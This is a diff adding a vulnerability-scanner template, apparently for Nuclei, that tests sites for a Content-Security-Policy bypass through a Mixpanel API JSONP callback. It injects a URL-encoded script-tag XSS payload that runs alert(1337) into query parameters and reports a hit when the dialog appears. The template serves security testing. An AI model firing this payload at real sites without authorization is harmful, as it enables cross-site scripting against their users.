@@ -1,0 +1,39 @@
+id: mixpanel-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Mixpanel API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,mixpanel-api
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: mixpanel_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "mixpanel_api_csp_xss == true"
+# digest: 490a00463044022051b86f7f4d3bc432b4f8c1df1f904add8f6104bb40b891dbdbe94c94463aad1202206f495b2983437e1a5beb27b91a4fd3359e3375f5808d516b27372b48be1e795b:922c64590222798bb761d5b6d8e72950
